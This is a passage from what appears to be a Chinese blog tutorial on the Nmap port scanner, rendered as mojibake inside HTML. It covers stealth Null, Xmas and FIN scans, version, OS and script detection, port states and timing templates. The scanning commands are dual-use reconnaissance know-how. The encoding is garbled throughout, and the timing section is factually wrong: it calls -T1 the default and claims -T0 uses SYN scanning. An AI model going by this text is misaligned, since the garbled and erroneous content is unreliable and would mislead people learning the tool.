RFCï¼Œç†è®ºä¸Šä¸åº”è¯¥æœ‰ä»»ä½•å“åº”ï¼Œä½†æœ‰äº›ç³»ç»Ÿå¯èƒ½ä¼šå¿½ç•¥è¿™ä¸ªè§„åˆ™å¹¶å‘é€ä¸€ä¸ªRSTæ•°æ®åŒ…ã€‚è¿™ç§æ‰«ææ–¹å¼ç›¸å¯¹éšè”½ï¼Œå› ä¸ºå®ƒä¸å‘é€æ ‡å‡†çš„SYNæˆ–ACKæ•°æ®åŒ…ï¼Œå¯èƒ½ä¼šç»•è¿‡ä¸€äº›ç®€å•çš„é˜²ç«å¢™æˆ–å…¥ä¾µæ£€æµ‹ç³»ç»Ÿã€‚</p></blockquote><ul><li>Xmasæ‰«æã€-sXã€‘</li></ul><blockquote><p><strong>Xmasæ‰«æï¼ˆ-sXï¼‰</strong>ï¼šè¿™ç§æ‰«ææ–¹å¼é€šè¿‡å‘é€å¸¦æœ‰FINã€PSHå’ŒURGæ ‡å¿—ä½çš„TCPæ•°æ®åŒ…æ¥æ¢æµ‹ç«¯å£çŠ¶æ€ã€‚è¿™ä¸‰ä¸ªæ ‡å¿—ä½åŒæ—¶ç½®ä½ï¼Œå°±åƒç‚¹äº®åœ£è¯æ ‘ä¸Šæ‰€æœ‰çš„ç¯ä¸€æ ·ï¼Œå› æ­¤å¾—åXmasæ‰«æã€‚å¦‚æœç›®æ ‡ç«¯å£å…³é—­ï¼Œé€šå¸¸ä¼šæ”¶åˆ°ä¸€ä¸ªRSTå“åº”ã€‚å¦‚æœç«¯å£å¼€æ”¾æˆ–è¢«è¿‡æ»¤ï¼Œå¯èƒ½ä¸ä¼šæœ‰ä»»ä½•å“åº”ï¼Œæˆ–è€…åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œå¯èƒ½ä¼šæ”¶åˆ°ä¸€ä¸ªRSTå“åº”ã€‚è¿™ç§æ‰«ææ–¹å¼åŒæ ·ç›¸å¯¹éšè”½ï¼Œå› ä¸ºå®ƒä¸ä½¿ç”¨æ ‡å‡†çš„TCPæ¡æ‰‹æ ‡å¿—ä½ã€‚</p></blockquote><ul><li>FINæ‰«æã€-sFã€‘</li></ul><blockquote><p><strong>FINæ‰«æï¼ˆ-sFï¼‰</strong>ï¼šåœ¨FINæ‰«æä¸­ï¼ŒNmap å‘é€ä¸€ä¸ªåªè®¾ç½®FINæ ‡å¿—ä½çš„TCPæ•°æ®åŒ…ã€‚å¦‚æœç›®æ ‡ç«¯å£å…³é—­ï¼Œä¼šæ”¶åˆ°ä¸€ä¸ªRSTå“åº”ã€‚å¦‚æœç«¯å£å¼€æ”¾ï¼Œé€šå¸¸ä¸ä¼šæœ‰ä»»ä½•å“åº”ã€‚è¿™ç§æ‰«ææ–¹å¼çš„éšè”½æ€§ä»‹äºSYNæ‰«æå’ŒXmas/Nullæ‰«æä¹‹é—´ï¼Œå› ä¸ºå®ƒåªä½¿ç”¨äº†ä¸€ä¸ªéæ ‡å‡†çš„æ ‡å¿—ä½ã€‚</p></blockquote><p>è¿™ä¸‰ç§æ‰«ææ–¹å¼è¢«ç§°ä¸ºâ€œç§˜å¯†æ‰«æâ€ï¼Œå› ä¸ºå®ƒä»¬æ—¨åœ¨æœ€å¤§ç¨‹åº¦åœ°é™ä½è¢«ç›®æ ‡ç³»ç»Ÿå¯Ÿè§‰çš„å¯èƒ½æ€§ã€‚å®ƒä»¬é€šè¿‡å‘é€éæ ‡å‡†çš„TCPæ•°æ®åŒ…æ¥æ¢æµ‹ç«¯å£çŠ¶æ€ï¼ŒåŸºäºç›®æ ‡ä¸»æœºå¯¹è¿™äº›å¼‚å¸¸æ•°æ®åŒ…çš„ä¸åŒå“åº”æ¥åˆ¤æ–­ç«¯å£æ˜¯å¦å¼€æ”¾ã€‚è¿™äº›æ‰«ææ–¹å¼çš„ç›®çš„åœ¨äºå°½é‡å‡å°‘åœ¨ç›®æ ‡ä¸»æœºä¸Šäº§ç”Ÿçš„æ—¥å¿—ä¿¡æ¯ï¼Œä»¥åŠé¿å…è§¦å‘é˜²ç«å¢™è§„åˆ™æˆ–å…¥ä¾µæ£€æµ‹ç³»ç»Ÿçš„è­¦æŠ¥ã€‚</p><h3 id="2-2-4-æ¢æµ‹ç«¯å£å¼€æ”¾çš„æœåŠ¡åŠç‰ˆæœ¬ï¼ˆ-sVï¼‰"><a href="#2-2-4-æ¢æµ‹ç«¯å£å¼€æ”¾çš„æœåŠ¡åŠç‰ˆæœ¬ï¼ˆ-sVï¼‰" class="headerlink" title="2.2.4 æ¢æµ‹ç«¯å£å¼€æ”¾çš„æœåŠ¡åŠç‰ˆæœ¬ï¼ˆ-sVï¼‰"></a>2.2.4 æ¢æµ‹ç«¯å£å¼€æ”¾çš„æœåŠ¡åŠç‰ˆæœ¬ï¼ˆ-sVï¼‰</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> <span class="token operator">&lt;</span>target<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™é‡Œçš„ <target> å¯ä»¥æ˜¯å•ä¸ª IP åœ°å€ã€åŸŸåæˆ–è€…æ˜¯ä¸€ä¸ª IP åœ°å€èŒƒå›´ã€‚</target></p><blockquote><p>Nmap çš„ <code>-sV</code> å‚æ•°ç”¨äºè¿›è¡ŒæœåŠ¡ç‰ˆæœ¬æ£€æµ‹ã€‚å½“ä½ åœ¨æ‰«æè¿‡ç¨‹ä¸­ä½¿ç”¨è¿™ä¸ªå‚æ•°æ—¶ï¼ŒNmap ä¼šå°è¯•ç¡®å®šè¿è¡Œåœ¨ç›®æ ‡ç«¯å£ä¸Šçš„æœåŠ¡çš„ç‰ˆæœ¬ä¿¡æ¯ã€‚è¿™å¯ä»¥é€šè¿‡åˆ†ææœåŠ¡å¯¹æ¢æµ‹è¯·æ±‚çš„å“åº”æ¥å®ç°ï¼ŒNmap ä¼šå‘é€ç‰¹å®šçš„æ•°æ®åŒ…åˆ°ç›®æ ‡ç«¯å£ï¼Œå¹¶æ ¹æ®æœåŠ¡çš„å“åº”æ¥è¯†åˆ«ç‰ˆæœ¬ã€‚</p></blockquote><img src="/2022/12/31/gong-fang-gong-ju-ku/nmap/%E6%88%AA%E5%B1%8F2024-12-31%2014.05.32.png" style="zoom:50%;"><h3 id="2-2-5-ç«¯å£çš„çŠ¶æ€"><a href="#2-2-5-ç«¯å£çš„çŠ¶æ€" class="headerlink" title="2.2.5 ç«¯å£çš„çŠ¶æ€"></a>2.2.5 ç«¯å£çš„çŠ¶æ€</h3><h4 id="1ï¼‰ClosedFiltered"><a href="#1ï¼‰ClosedFiltered" class="headerlink" title="1ï¼‰ClosedFiltered"></a>1ï¼‰ClosedFiltered</h4><p>è¯¥çŠ¶æ€ç”¨äºNmapä¸èƒ½ç¡®å®šç«¯å£æ˜¯å…³é—­çš„è¿˜æ˜¯è¢«è¿‡æ»¤çš„ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œå®ƒåªå¯èƒ½å‡ºç°åœ¨IPID Idleæ‰«æä¸­ã€‚</p><h4 id="2ï¼‰filtered"><a href="#2ï¼‰filtered" class="headerlink" title="2ï¼‰filtered"></a>2ï¼‰filtered</h4><p>å‰é¢è®²åˆ°æŒæ¡ä¸€å®šå®‰å…¨æŠ€æœ¯çš„ç®¡ç†å‘˜ä¼šå¸ƒç½®ä¸€ä¸ªé˜²ç«å¢™è®¾å¤‡æˆ–è€…æ˜¯é€šè¿‡è®¾ç½®è·¯ç”±å™¨çš„è§„åˆ™é˜»æ­¢Nmapçš„æ‰«æï¼Œã€å½“Nmapé‡åˆ°é˜²ç«å¢™è®¾å¤‡æˆ–æ˜¯è·¯ç”±å™¨è§„åˆ™çš„æ—¶å€™ï¼ŒNmapçš„æŠ¥æ–‡å°±ä¼šè¢«è¿‡æ»¤è¾¾åˆ°ç›®æ ‡ç«¯å£ï¼Œè¿™æ ·å°±ä¼šä½¿Nmapæ— æ³•åˆ¤æ–­ç›®æ ‡ç«¯å£åˆ°åº•æ˜¯å¦å¼€æ”¾äº†ã€‚ã€‘å‡ºç°è¢«è¿‡æ»¤ç°è±¡å¹¶ä¸ä»£è¡¨ä¸€å®šæ˜¯è¢«æŸäº›ä¸“ä¸šçš„è®¾å¤‡è¿‡æ»¤äº†ï¼Œä¹Ÿè®¸æ˜¯å› ä¸ºç½‘ç»œå µå¡é€ æˆçš„ï¼Œå»ºè®®é‡åˆ°è¢«è¿‡æ»¤çŠ¶æ€æ—¶ã€åˆ†ä¸åŒçš„æ—¶é—´æ®µå†æ¬¡è¿›è¡Œæ‰«æã€‘ã€‚</p><h4 id="3ï¼‰closed"><a href="#3ï¼‰closed" class="headerlink" title="3ï¼‰closed"></a>3ï¼‰closed</h4><p>å½“ç«¯å£å…³é—­çš„æ—¶å€™Nmapä¹Ÿå¯ä»¥è½»è€Œæ˜“ä¸¾åœ°å°†å…¶æ£€æµ‹å‡ºæ¥ï¼Œå› ä¸ºæ¥å—äº†Nmapçš„æ¢æµ‹æŠ¥æ–‡å¹¶ä½œå‡ºäº†å“åº”ï¼Œå½“ç„¶ï¼Œè¿™ä¹Ÿã€ä¸èƒ½å¿½ç•¥æ˜¯ç®¡ç†å‘˜çš„ä¸€ä¸ªæ¬ºéª—æ”»å‡»è€…çš„æŠŠæˆã€‘ï¼Œå¦‚æœå‘ç°æ²¡æœ‰å¼€æ”¾çš„ç«¯å£ï¼Œå¯ä»¥ç­‰å¾…ä¸€ä¼šå†æ¬¡æ‰«æä¸€ä¸‹å¯èƒ½åˆå‘ˆç°å¼€æ”¾çŠ¶æ€äº†ã€‚å¦‚æœç®¡ç†å‘˜æŒæ¡ä¸€å®šçš„å®‰å…¨æŠ€æœ¯ï¼Œå¯èƒ½ä¼šä½¿ç”¨é˜²ç«å¢™å¯¹è¿™äº›ç«¯å£è¿›è¡Œé˜²æŠ¤ï¼Œä¸è¿‡ï¼Œè¿™å¹¶ä¸ä¼šé˜»ç¢æˆ‘ä»¬å‘ç°è¿™ä¸ªç«¯å£ï¼Œã€å¦‚æœè¢«æœªçŸ¥æˆ–å·²çŸ¥çš„é˜²ç«å¢™é˜»æŒ¡è®¿é—®ç›®æ ‡ç«¯å£ï¼ŒNmapä¹Ÿä¼šæç¤ºâ€œæˆ‘é‡åˆ°äº†ä¸€äº›æƒ…å†µï¼Œå¥½åƒè¢«é˜²ç«å¢™æŒ¡ä½äº†ã€‚ã€‘â€</p><h4 id="4ï¼‰Unfiltered"><a href="#4ï¼‰Unfiltered" class="headerlink" title="4ï¼‰Unfiltered"></a>4ï¼‰Unfiltered</h4><p>æœªè¢«è¿‡æ»¤çŠ¶æ€æ„å‘³ç€ã€ç«¯å£å¯ä»¥è®¿é—®ï¼Œä½†æ˜¯Nmapå¹¶ä¸èƒ½åˆ¤æ–­ç›®æ ‡ç«¯å£å¤„äºå¼€æ”¾çŠ¶æ€è¿˜æ˜¯å…³é—­çŠ¶æ€ã€‘ï¼Œè¿™é‡Œéœ€è¦é‡ç”³çš„æ˜¯ç›®æ ‡ç«¯å£æ˜¯å¦å¯ä»¥è®¿é—®ä¸æ˜¯å¦å¼€æ”¾å¹¶æ— å¤ªå¤§çš„è”ç³»ï¼Œä¾‹å¦‚ï¼Œå…³é—­çš„ç«¯å£ä¹Ÿå¯ä»¥æ¥å—Nmapå‘å‡ºå»çš„æ¢æµ‹æŠ¥æ–‡ã€‚éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå½“æˆ‘ä»¬ã€ä½¿ç”¨ACKæ‰«ææ—¶æ‰ä¼šå‘ˆç°å‡ºè¿™ç§çŠ¶æ€ã€‘ï¼Œè¿™æ—¶æˆ‘ä»¬å¯ä»¥æ¢ä¸€ç§æ‰«ææ–¹å¼å»è¿›è¡Œæ‰«æï¼Œä»¥ä¾¿äºè¿›ä¸€æ­¥ç¡®è®¤ç›®æ ‡ç«¯å£æ˜¯å¦å¼€æ”¾ã€‚</p><h4 id="5ï¼‰OpenFiltered"><a href="#5ï¼‰OpenFiltered" class="headerlink" title="5ï¼‰OpenFiltered"></a>5ï¼‰OpenFiltered</h4><p>å¼€æ”¾è¿˜æ˜¯è¿‡æ»¤çš„ï¼Œå¦‚æœNmapå‘å‡ºå»çš„æ¢æµ‹æŠ¥æ–‡å¹¶æ²¡æœ‰å¾—åˆ°ç›®æ ‡ç«¯å£çš„å“åº”ï¼Œé‚£å¯èƒ½ä¼šæ˜¯å—åˆ°äº†æŸäº›ä¸“ä¸šè®¾å¤‡çš„é˜»æŒ¡ï¼Œä½†è¿™ä¹Ÿä¸æ˜¯å®Œå…¨ä¸€ä¸ªè¢«è¿‡æ»¤çš„çŠ¶æ€ï¼Œè¿™æ—¶Nmapå°±ä¼šå‘ˆç°å‡ºç›®æ ‡ç«¯å£æ˜¯å¼€æ”¾è¿˜æ˜¯è¢«è¿‡æ»¤çš„ã€‚å‡ºç°è¿™ç§çŠ¶æ€ã€ä¸å¦¨æ¢ä¸€ç§æ‰«ææ–¹å¼ã€‘è¿›ä¸€æ­¥ç¡®è®¤ç›®æ ‡ç«¯å£æ˜¯å¼€æ”¾è¿˜æ˜¯è¢«è¿‡æ»¤çš„ã€‚</p><h4 id="6ï¼‰open"><a href="#6ï¼‰open" class="headerlink" title="6ï¼‰open"></a>6ï¼‰open</h4><p>å‘ç°è¿™ä¸€ç‚¹æ˜¯ç«¯å£æ‰«æå·¥å…·çš„èŒè´£æ‰€åœ¨ï¼Œæ¯ä¸€ä¸ªç«¯å£å°±å¯èƒ½ä¼šæ˜¯ä¸€æ¬¡è¢«æ”»å‡»æˆåŠŸçš„å¤§é—¨ï¼Œç®¡ç†å‘˜ä¹Ÿä¸ä¼šå°†ä¸€ä¸ªç«¯å£éšä¾¿å…³é—­ï¼Œè¿™ä¼šä½¿åˆæ³•ç”¨æˆ·äº§ç”Ÿä¸å¿…è¦çš„éº»çƒ¦ã€‚å½“æˆ‘ä»¬ä½¿ç”¨Nmapè¿›è¡Œç«¯å£æ‰«ææ—¶ï¼Œã€å¦‚æœç«¯å£çŠ¶æ€ä¸ºOpen,è¯´æ˜æ­¤ç«¯å£å¯¹å¤–ä¸ºå¼€æ”¾çŠ¶æ€ã€‘ï¼Œç¡®å®šä¸ºOpençŠ¶æ€ä¾¿äºæˆ‘ä»¬åˆ¶å®šä¸‹ä¸€æ­¥çš„æ¸—é€è®¡åˆ’ã€‚</p><h2 id="2-3-æ“ä½œç³»ç»Ÿç±»å‹-ï¼ˆ-Oï¼‰"><a href="#2-3-æ“ä½œç³»ç»Ÿç±»å‹-ï¼ˆ-Oï¼‰" class="headerlink" title="2.3 æ“ä½œç³»ç»Ÿç±»å‹ ï¼ˆ-Oï¼‰"></a>2.3 æ“ä½œç³»ç»Ÿç±»å‹ ï¼ˆ-Oï¼‰</h2><p> æ“ä½œç³»ç»Ÿç±»å‹ ã€ä¸å¤ªå‡†ç¡®ã€‘</p><p>Nmap çš„ <code>-O</code> å‚æ•°ç”¨äºè¿›è¡Œæ“ä½œç³»ç»Ÿæ£€æµ‹ã€‚å½“ä½ åœ¨æ‰«æè¿‡ç¨‹ä¸­ä½¿ç”¨è¿™ä¸ªå‚æ•°æ—¶ï¼ŒNmap ä¼šå°è¯•ç¡®å®šç›®æ ‡ä¸»æœºè¿è¡Œçš„æ“ä½œç³»ç»Ÿã€‚</p><p>Nmap çš„æ“ä½œç³»ç»Ÿæ£€æµ‹åŠŸèƒ½éå¸¸å¼ºå¤§ï¼Œä½†éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œæ£€æµ‹ç»“æœå¯èƒ½ä¸æ˜¯ 100% å‡†ç¡®ï¼Œå› ä¸ºæ“ä½œç³»ç»Ÿçš„å“åº”æ¨¡å¼å¯èƒ½ä¼šå› ä¸ºç½‘ç»œè®¾å¤‡ã€é˜²ç«å¢™é…ç½®æˆ–æ“ä½œç³»ç»Ÿçš„ç‰¹å®šè®¾ç½®è€Œå˜åŒ–ã€‚æ­¤å¤–ï¼Œä¸€äº›é«˜çº§ç”¨æˆ·æˆ–ç®¡ç†å‘˜å¯èƒ½ä¼šé‡‡å–æªæ–½æ¥æ··æ·†æˆ–ä¼ªè£…æ“ä½œç³»ç»Ÿçš„è¯†åˆ«ï¼Œä»¥æé«˜å®‰å…¨æ€§ã€‚</p><p>åˆ¤æ–­æ“ä½œç³»ç»Ÿç±»å‹ éœ€è¦ç»¼åˆæ‰‹æ®µã€‚</p><h2 id="2-4-ä¿å­˜æ‰«æç»“æœ-ï¼ˆoX-oNï¼‰"><a href="#2-4-ä¿å­˜æ‰«æç»“æœ-ï¼ˆoX-oNï¼‰" class="headerlink" title="2.4 ä¿å­˜æ‰«æç»“æœ ï¼ˆoX /-oNï¼‰"></a>2.4 ä¿å­˜æ‰«æç»“æœ ï¼ˆoX /-oNï¼‰</h2><ul><li>ã€ä¿å­˜ä¸ºxmlæ ¼å¼ï¼Œä¿å­˜ä¸ºtxtæ ¼å¼ã€‘</li></ul><h2 id="2-5-å…¨é¢æ‰«æ-ï¼ˆ-Aï¼‰"><a href="#2-5-å…¨é¢æ‰«æ-ï¼ˆ-Aï¼‰" class="headerlink" title="2.5 å…¨é¢æ‰«æ ï¼ˆ-Aï¼‰"></a>2.5 å…¨é¢æ‰«æ ï¼ˆ-Aï¼‰</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-A</span> <span class="token function">ip</span> <span class="token parameter variable">-oN</span> æ–‡ä»¶å<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>Nmap çš„ <code>-A</code> å‚æ•°æ˜¯ä¸€ä¸ªå¼ºå¤§çš„é€‰é¡¹ï¼Œå®ƒä»£è¡¨â€œä¾µç•¥æ€§æ‰«æâ€ï¼ˆAggressive Scanï¼‰ã€‚ä½¿ç”¨ <code>-A</code> å‚æ•°æ—¶ï¼ŒNmap ä¼šåŒæ—¶è¿›è¡Œå¤šç§ç±»å‹çš„æ‰«æï¼ŒåŒ…æ‹¬ï¼š</p><ol><li><strong>æ“ä½œç³»ç»Ÿæ£€æµ‹</strong>ï¼ˆ-Oï¼‰ï¼šå°è¯•è¯†åˆ«ç›®æ ‡ä¸»æœºçš„æ“ä½œç³»ç»Ÿç±»å‹å’Œç‰ˆæœ¬ã€‚</li><li><strong>æœåŠ¡ç‰ˆæœ¬æ£€æµ‹</strong>ï¼ˆ-sVï¼‰ï¼šç¡®å®šè¿è¡Œåœ¨ç›®æ ‡ç«¯å£ä¸Šçš„æœåŠ¡çš„ç‰ˆæœ¬ä¿¡æ¯ã€‚</li><li><strong>è„šæœ¬æ‰«æ</strong>ï¼ˆâ€“scriptï¼‰ï¼šæ‰§è¡Œä¸€ç³»åˆ—é¢„å®šä¹‰çš„è„šæœ¬ï¼Œè¿™äº›è„šæœ¬å¯ä»¥ç”¨äºè‡ªåŠ¨åŒ–å¸¸è§çš„æ¸—é€æµ‹è¯•ä»»åŠ¡ï¼Œå¦‚æ£€æµ‹å·²çŸ¥æ¼æ´ã€æœåŠ¡é…ç½®é—®é¢˜ç­‰ã€‚</li><li><strong>traceroute</strong>ï¼šåœ¨è¯†åˆ«ç›®æ ‡ä¸»æœºä¸Šè¿è¡Œçš„æœåŠ¡åŠå…¶ç‰ˆæœ¬ä¿¡æ¯æ—¶ï¼ŒNmap ä¼šæ‰§è¡Œ traceroute æ¥è·Ÿè¸ªæ•°æ®åŒ…çš„è·¯ç”±è·¯å¾„ã€‚</li></ol><p><code>-A</code> å‚æ•°çš„ä¾µç•¥æ€§è¾ƒé«˜ï¼Œå› ä¸ºå®ƒä¼šè¿›è¡Œæ›´å¤šçš„æ¢æµ‹ï¼Œè¿™å¯èƒ½ä¼šåœ¨ç›®æ ‡ä¸»æœºä¸Šäº§ç”Ÿæ›´å¤šçš„æ—¥å¿—æ¡ç›®ï¼Œä»è€Œæé«˜è¢«ç›®æ ‡ç³»ç»Ÿç®¡ç†å‘˜å¯Ÿè§‰çš„é£é™©ã€‚å› æ­¤ï¼Œåœ¨è¿›è¡Œ <code>-A</code> æ‰«ææ—¶ï¼Œåº”ç¡®ä¿ä½ æœ‰é€‚å½“çš„æˆæƒï¼Œä»¥é¿å…è¿åæ³•å¾‹æ³•è§„æˆ–é“å¾·è§„èŒƒã€‚</p><p>æ­¤å¤–ï¼Œ<code>-A</code> å‚æ•°å¯ä»¥ä¸å…¶ä»–å‚æ•°ç»“åˆä½¿ç”¨ï¼Œä»¥è¿›ä¸€æ­¥å®šåˆ¶æ‰«æè¡Œä¸ºã€‚ä¾‹å¦‚ï¼Œ<code>-p</code> å‚æ•°å¯ä»¥ç”¨æ¥æŒ‡å®šç‰¹å®šçš„ç«¯å£èŒƒå›´ï¼Œ<code>-T</code> å‚æ•°å¯ä»¥ç”¨æ¥è°ƒæ•´æ‰«æçš„é€Ÿåº¦ï¼ˆ0-5ï¼Œ0 ä»£è¡¨æœ€æ…¢ï¼Œ5 ä»£è¡¨æœ€å¿«ï¼‰ã€‚</p></blockquote><h2 id="2-6-æŒ‡å®šå¼ºåº¦"><a href="#2-6-æŒ‡å®šå¼ºåº¦" class="headerlink" title="2.6 æŒ‡å®šå¼ºåº¦"></a>2.6 æŒ‡å®šå¼ºåº¦</h2><p>-T0ï½5</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-T4</span> <span class="token operator">&lt;</span>target<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>åœ¨ Nmap ä¸­ï¼Œ<code>-T</code> å‚æ•°ç”¨äºæ§åˆ¶æ‰«æçš„é€Ÿåº¦å’Œå¼ºåº¦ã€‚è¿™ä¸ªå‚æ•°çš„å€¼ä» 0 åˆ° 5ï¼Œæ¯ä¸ªå€¼ä»£è¡¨ä¸åŒçš„æ‰«æç­–ç•¥ï¼Œå½±å“æ‰«æçš„éšè”½æ€§å’Œé€Ÿåº¦ã€‚ä»¥ä¸‹æ˜¯æ¯ä¸ªå€¼çš„å«ä¹‰ï¼š</p><ol><li>**<code>-T0</code> (ææ…¢ï¼Œæéšè”½)**ï¼šè¿™ç§æ¨¡å¼ä¸‹ï¼ŒNmap ä¼šä½¿ç”¨æœ€éšè”½çš„æ‰«ææŠ€æœ¯ï¼Œå¦‚ SYN æ‰«æï¼ˆå¦‚æœæ²¡æœ‰ä½¿ç”¨ <code>-Pn</code> å‚æ•°æ¥ç¦ç”¨ ICMP ä¸»æœºå‘ç°ï¼‰ã€‚å®ƒå¯èƒ½ä¼šä½¿ç”¨æ›´å¤šçš„ç³»ç»Ÿèµ„æºæ¥éšæœºåŒ–å’Œå»¶è¿Ÿæ¢æµ‹ï¼Œä»¥å‡å°‘è¢«æ£€æµ‹åˆ°çš„å¯èƒ½æ€§ã€‚</li><li>**<code>-T1</code> (æ…¢ï¼Œéšè”½)**ï¼šè¿™æ˜¯é»˜è®¤çš„æ‰«æé€Ÿåº¦ï¼Œæä¾›äº†ä¸€ä¸ªå¹³è¡¡çš„æ‰«æé€Ÿåº¦å’Œéšè”½æ€§ã€‚å¯¹äºå¤§å¤šæ•°æ—¥å¸¸æ‰«æä»»åŠ¡ï¼Œè¿™æ˜¯ä¸€ä¸ªå¾ˆå¥½çš„èµ·ç‚¹ã€‚</li><li>**<code>-T2</code> (ä¸­ç­‰é€Ÿåº¦ï¼Œè¾ƒå°‘éšè”½)**ï¼šè¿™ç§æ¨¡å¼ä¸‹ï¼ŒNmap ä¼šåŠ å¿«æ‰«æé€Ÿåº¦ï¼Œä½†å¯èƒ½ä¼šç‰ºç‰²ä¸€äº›éšè”½æ€§ã€‚è¿™é€‚ç”¨äºå½“ä½ éœ€è¦åœ¨ä¸å¤ªå…³æ³¨éšè”½æ€§çš„æƒ…å†µä¸‹å¿«é€Ÿå®Œæˆæ‰«ææ—¶ã€‚</li><li>**<code>-T3</code> (å¿«)**ï¼šåœ¨è¿™ä¸ªçº§åˆ«ï¼ŒNmap ä¼šè¿›ä¸€æ­¥åŠ å¿«æ‰«æé€Ÿåº¦ï¼Œå¯èƒ½ä¼šäº§ç”Ÿæ›´å¤šçš„ç½‘ç»œæµé‡ï¼Œä»è€Œæ›´å®¹æ˜“è¢«ç½‘ç»œç›‘æ§ç³»ç»Ÿæ£€æµ‹åˆ°ã€‚</li><li>**<code>-T4</code> (éå¸¸å¿«)**ï¼šè¿™ç§æ¨¡å¼ä¸‹ï¼ŒNmap ä¼šå°½å¯èƒ½å¿«åœ°å‘é€æ¢æµ‹æ•°æ®åŒ…ï¼Œç‰ºç‰²éšè”½æ€§ä»¥æ¢å–é€Ÿåº¦ã€‚è¿™é€‚ç”¨äºå½“ä½ éœ€è¦å¿«é€Ÿæ‰«æå¹¶ä¸”ä¸å¤ªå…³å¿ƒæ˜¯å¦è¢«å‘ç°æ—¶ã€‚</li><li>**<code>-T5</code> (æœ€å¿«)**ï¼šè¿™æ˜¯æœ€å¿«çš„æ‰«ææ¨¡å¼ï¼ŒNmap ä¼šä»¥æœ€å¿«çš„é€Ÿåº¦å‘é€æ¢æµ‹æ•°æ®åŒ…ï¼Œå‡ ä¹ä¸è€ƒè™‘éšè”½æ€§ã€‚è¿™ç§æ¨¡å¼å¯èƒ½ä¼šå¯¹ç½‘ç»œæ€§èƒ½äº§ç”Ÿè¾ƒå¤§å½±å“ï¼Œå¹¶ä¸”å¾ˆå®¹æ˜“è¢«æ£€æµ‹åˆ°ã€‚</li></ol></blockquote><h2 id="2-7-å¯åŠ¨è„šæœ¬æ‰«æï¼ˆ-sCï¼‰"><a href="#2-7-å¯åŠ¨è„šæœ¬æ‰«æï¼ˆ-sCï¼‰" class="headerlink" title="2.7 å¯åŠ¨è„šæœ¬æ‰«æï¼ˆ-sCï¼‰"></a>2.7 å¯åŠ¨è„šæœ¬æ‰«æï¼ˆ-sCï¼‰</h2><p>Nmap çš„ <code>-sC</code> å‚æ•°ç”¨äºå¯ç”¨è„šæœ¬æ‰«æã€‚è¿™ä¸ªå‚æ•°ä¼šå‘Šè¯‰ Nmap åœ¨å‘ç°å¼€æ”¾ç«¯å£åï¼Œè‡ªåŠ¨è¿è¡Œä¸€ç»„é»˜è®¤çš„ NSEï¼ˆNmap Scripting Engineï¼‰è„šæœ¬ã€‚è¿™äº›è„šæœ¬å¯ä»¥ç”¨äºæ”¶é›†ç›®æ ‡ç³»ç»Ÿçš„å„ç§ä¿¡æ¯ï¼Œå¦‚æœåŠ¡çš„æ›´å¤šç»†èŠ‚ã€æ½œåœ¨çš„å®‰å…¨æ¼æ´ã€é…ç½®é—®é¢˜ç­‰ã€‚</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sC</span> <span class="token operator">&lt;</span>target<span class="token operator">&gt;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™é‡Œçš„ <code>&lt;target&gt;</code> å¯ä»¥æ˜¯å•ä¸ª IP åœ°å€ã€åŸŸåæˆ–è€…æ˜¯ä¸€ä¸ª IP åœ°å€èŒƒå›´ã€‚</p><blockquote><p>NSE è„šæœ¬æ˜¯ Nmap çš„ä¸€ä¸ªå¼ºå¤§ç‰¹æ€§ï¼Œå®ƒä»¬å¯ä»¥æ‰©å±• Nmap çš„åŠŸèƒ½ï¼Œä½¿å…¶èƒ½å¤Ÿæ‰§è¡Œå„ç§å¤æ‚çš„ä»»åŠ¡ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä¸€ä¸ªç«¯å£è¢«è¯†åˆ«ä¸ºè¿è¡Œ Web æœåŠ¡å™¨ï¼ŒNmap å¯ä»¥è¿è¡Œç‰¹å®šçš„è„šæœ¬æ¥æ£€æŸ¥ Web åº”ç”¨ç¨‹åºçš„å®‰å…¨é—®é¢˜ï¼Œå¦‚å¸¸è§çš„æ¼æ´ã€é”™è¯¯çš„é…ç½®ã€æœåŠ¡çš„ç‰ˆæœ¬ä¿¡æ¯ç­‰ã€‚</p><p><code>-sC</code> å‚æ•°é€šå¸¸ä¸å…¶ä»–å‚æ•°ä¸€èµ·ä½¿ç”¨ï¼Œä»¥æä¾›æ›´å…¨é¢çš„æ‰«æç»“æœã€‚ä¾‹å¦‚ï¼Œç»“åˆ <code>-sV</code> å‚æ•°å¯ä»¥åŒæ—¶è¿›è¡ŒæœåŠ¡ç‰ˆæœ¬æ£€æµ‹å’Œè„šæœ¬æ‰«æï¼Œè€Œ <code>-p</code> å‚æ•°å¯ä»¥æŒ‡å®šè¦æ‰«æçš„ç«¯å£èŒƒå›´ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè„šæœ¬æ‰«æå¯èƒ½ä¼šæ¯”åŸºæœ¬çš„ç«¯å£æ‰«ææ¶ˆè€—æ›´å¤šçš„æ—¶é—´å’Œèµ„æºï¼Œå› ä¸ºå®ƒæ¶‰åŠåˆ°å¯¹æ¯ä¸ªå¼€æ”¾ç«¯å£æ‰§è¡Œé¢å¤–çš„è„šæœ¬ã€‚æ­¤å¤–ï¼ŒæŸäº›è„šæœ¬å¯èƒ½ä¼šå¯¹ç›®æ ‡ç³»ç»Ÿäº§ç”Ÿé¢å¤–çš„è´Ÿè½½ï¼Œå› æ­¤åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ä½¿ç”¨æ—¶åº”è°¨æ…ã€‚</p></blockquote><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>æ€»ä¹‹ï¼ŒNmapï¼ˆNetwork 